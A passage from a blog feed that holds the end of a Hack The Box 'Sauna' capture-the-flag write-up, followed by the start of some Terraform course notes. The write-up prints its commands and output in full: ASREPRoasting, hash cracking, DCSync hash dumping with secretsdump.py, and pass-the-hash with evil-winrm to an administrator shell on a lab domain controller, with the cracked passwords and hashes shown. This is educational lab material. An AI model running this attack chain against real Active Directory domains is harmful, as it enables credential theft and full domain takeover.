    &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Some&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AutoLogon&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;credentials&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;were&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;found&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DefaultDomainName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EGOTISTICALBANK&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DefaultUserName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;EGOTISTICALBANK\svc_loanmanager&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DefaultPassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Moneymakestheworldgoround&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I now had another set of credentials, but I wasn’t sure what to do with them.  I did some more enumeration.  Eventually after getting a hint from the forums (I’m pretty bad at knowing what to enumerate for now, but I’m certain that will change as I learn more about what to look for..), I realized I could dump passwords using impacket again because of excessive permissions given to the &lt;em&gt;svc_loanmgr&lt;/em&gt; account.  So that is what I did.&lt;/p&gt;

&lt;p&gt;But before we get to that, I went back after owning root and did some reading on what I should of found in order to understand why &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; works.  I did some enumeration on the service account and found the excessive permissions (I was &lt;em&gt;svc_loanmgr&lt;/em&gt; in the screenshot but it works as &lt;em&gt;fsmith&lt;/em&gt; user too):&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Import-module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ActiveDirectory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Acl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ad:\dc=egotistical-bank,dc=local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Access&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IdentityReference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-match&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'svc_loanmgr'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-or&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-or&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Sauna/dcsync-permissions.png&quot; alt=&quot;DCSync-permissions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The service account has the permissions to replicate DC changes thus allowing for a DCSync attack.  Therefore, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; tool is able to dump hashes from the domain controller.&lt;/p&gt;

&lt;p&gt;I dumped the hashes via impacket’s secretsdump tool:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python secretsdump.py egotistical-bank.local/svc_loanmgr:&lt;span class=&quot;s2&quot;&gt;&quot;Moneymakestheworldgoround!&quot;&lt;/span&gt;@10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.10.175
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:rid:lmhash:nthash&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
&amp;lt;&lt;span class=&quot;nt&quot;&gt;--Snipped--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, with the hash available I used evil-winrm to pass the hash to get an admininstrative shell on the box.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;evil-winrm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10.10.10.175&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Administrator&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d9485863c1e9e05851aa40cbb4ab9dff&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v2.3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Info:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Establishing&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;endpoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\Administrator\Documents&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;egotisticalbank\administrator&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\Administrator\Documents&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h3&gt;

&lt;p&gt;This box was very fun and many firsts for me when it comes to new tools.&lt;/p&gt;

&lt;p&gt;Some of the things I learned with this box:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;How a DC Sync can happen with improper domain level permissions&lt;/li&gt;
  &lt;li&gt;Some of the static GUIDs that roles have within a domain.&lt;/li&gt;
  &lt;li&gt;The tool Evil-WinRM which was easy to use.&lt;/li&gt;
  &lt;li&gt;Attacking a domain controller using impacket tools.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>wittr</name></author><category term="writeups" /><summary type="html">Summary Sauna was a great box for learning some Active Directory recon and attacks through the use of impacket tooling. It involved using ASREPRoast and cracking a hash to gain a foothold with a tool like evil-winrm, followed by enumeration of bad domain permissions to escalate privileges via a DCSync Attack. Walkthrough Enumeration Starting with nmap as always: nmap -A -T4 -v 10.10.10.175 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-17 08:32:14Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Based off this nmap, it is pretty clear to see it seems to be a domain controller with ports like 53 (DNS), 88 (Kerberos), etc. open. I decided to checkout the website it is hosting. I poked around for awhile, it was basically a bank site. I generally didn’t know what to pursue next so I went to the forums for clues. I had not used impacket tooling much at this point, and it looked like some of their scripts was where to go next. I ended up playing with GetNPUsers.py from impacket and learning its parameters and how it can be used for ASREPRoast. The user that worked was “fsmith” (a guess based off common username nomenclature) which basically was “Fergus Smith” from the “Meet the Team” section of the website. So I ran the GetNPUsers.py script. python GetNPUsers.py egotistical-bank.local/fsmith -no-pass -dc-ip 10.10.10.175 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for fsmith $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ffc4a4278df19115d39740cd03e9db57$a0425a79f8c405a2d4707123842038f135fe400c37d4d774b6dd3d2d9ecaa32b7621bc9a8784d9e77db5c9bc919905025b4bfddc4da93c6bcdcddef1a8208831dbc64ac6bb380288b7cb67f9c2000d74bdd80a7c5c80b99f3706568c1e615a8e6c762d95e7e212c1f3c362a9e076c9ce50e3ae634e8657d7c79188ab74598361a14c08522e8d5367324c1832305ffc6f3e923f32e2d86b4a812978c9eb30c2b6ca02632730b603bb16863f0b490e8a74bc2045dedd90148691919aeab2f6459d09dfc2a1085f849a93ad610ce83bdbb26988145e8c64f64c96632585186e712d500055c2328f0d2325b751f3e1885cd43a49bb006f64922d17865aaf6e09128b With this hash I ran it through John the ripper and used the usual rockyou.txt to see if I get a hit. sudo john -w=/usr/share/wordlists/rockyou.txt fsmith-hash.txt Created directory: /root/.john Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]) Press 'q' or Ctrl-C to abort, almost any other key for status Thestrokes23 (?) 1g 0:00:00:36 DONE (2020-07-15 23:22) 0.02755g/s 290401p/s 290401c/s 290401C/s ThetaNuTheta..Thessa1 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed Foothold Alright, now I’m getting somewhere! I decided to try the enum4linux script that comes with Kali since I had a username and password. However, it didn’t really point me at anything in particular and I didn’t keep it in my notes to post here. I eventually figured out that I could get a shell using evil-winrm which is a great tool. I fired up a shell using the command evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 User Looking at the Desktop directory real quick I was able to grab the flag. I didn’t have to move laterally as fsmith was the user to own here. ```powershell Evil-WinRM PS C:\Users\FSmith\desktop&amp;gt; dir</summary></entry><entry><title type="html">Terraform Notes</title><link href="/tools/2020/07/14/Terraform-notes.html" rel="alternate" type="text/html" title="Terraform Notes" /><published>2020-07-14T22:42:00-05:00</published><updated>2020-07-14T22:42:00-05:00</updated><id>/tools/2020/07/14/Terraform-notes</id><content type="html" xml:base="/tools/2020/07/14/Terraform-notes.html">&lt;p&gt;&lt;img src=&quot;data:image/png;base64,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&quot; alt=&quot;Terraform&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Below are notes I took a few months ago when doing a Udemy Terraform course.  I may update them over time as I learn more.&lt;/p&gt;

&lt;h2 id=&quot;terraform-commands&quot;&gt;Terraform commands&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Plan&lt;/li&gt;
  &lt;li&gt;Apply&lt;/li&gt;
  &lt;li&gt;Destroy&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;plan&quot;&gt;Plan&lt;/h3&gt;

&lt;p&gt;Plan is used to preview changes to the infrastructure.&lt;br /&gt;
Use:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform plan&lt;/code&gt; for output stdin, or in practice &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;teraform plan -out &amp;lt;file&amp;gt;&lt;/code&gt;&lt;br /&gt;
The file is used in apply.&lt;/p&gt;

&lt;h3 id=&quot;apply&quot;&gt;Apply&lt;/h3&gt;

&lt;p&gt;Makes changes to the infrastructure.&lt;/p&gt;

&lt;h3 id=&quot;destroy&quot;&gt;Destroy&lt;/h3&gt;

&lt;p&gt;Removes all infrastucture defined in plan files.  Be careful in production!&lt;/p&gt;

&lt;h2 id=&quot;terraform-state&quot;&gt;Terraform State&lt;/h2&gt;

&lt;p&gt;Terraform keeps the remote state of the infrastructure.&lt;/p&gt;

&lt;p&gt;It stores it in a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terraform.tfstate&lt;/code&gt;.  There’s also a backup of the previous state (.backup).&lt;/p&gt;

&lt;p&gt;If you run terraform apply after terminating an instance (or any defined node etc.) manually, Terraform will re-create it if it is part of the configuration.&lt;/p&gt;

&lt;p&gt;The state file can be put into version control to see history of the infrastructure (JSON file). Allows for collaboration (beware of conflicts).&lt;/p&gt;

&lt;p&gt;Large projects require storage of state in a remote repository.&lt;/p&gt;

&lt;p&gt;Best not to have giant state files.&lt;/p&gt;

&lt;h3 id=&quot;remote-storage&quot;&gt;Remote Storage&lt;/h3&gt;

&lt;p&gt;This is called the &lt;em&gt;backend&lt;/em&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;S3&lt;/li&gt;
  &lt;li&gt;Consul&lt;/li&gt;
  &lt;li&gt;Terraform enterprise&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;benefits&quot;&gt;Benefits&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Allows for collaboration, always available to the whole team.&lt;/li&gt;
  &lt;li&gt;Sensitive information is not stored locally.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Enhanced backends&lt;/em&gt; allow for remote operations.&lt;/li&gt;
  &lt;li&gt;Avoid having to push the terraform.tfstate to version control.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;cautions&quot;&gt;Cautions&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Not all remote stores support &lt;em&gt;locking&lt;/em&gt;.  S3 and Consul do.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;example-configuration&quot;&gt;Example Configuration&lt;/h3&gt;

&lt;div class=&quot;language-hcl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;terraform&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;backend&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s3&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;bucket&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bucket&quot;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;terraform/myproject&quot;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;region&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;us-west-1&quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;other-state-information&quot;&gt;Other State Information&lt;/h3&gt;

